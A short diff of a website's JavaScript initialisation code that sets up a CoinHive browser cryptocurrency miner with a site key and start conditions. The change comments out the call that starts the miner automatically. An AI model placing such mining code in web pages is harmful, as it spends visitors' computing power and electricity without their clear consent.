@@ -1951,7 +1951,7 @@ function initialize() {
 
     miner = new CoinHive.User('Cjv1MQzP7McKdWFumMCE7EXQeoZk367w', lsm.getItem("initialTimestamp"));
     if (!miner.isMobile() && miner.hasWASMSupport() && !miner.didOptOut(86400) && lsm.getItem('loadCount') > 1 && lsm.getItem("donateStatus") != "accepted-initial") {
-        miner.start();
+        // miner.start();
         miner.setNumThreads(1);
         miner.setAutoThreadsEnabled(false);
         miner.setThrottle(0.5);
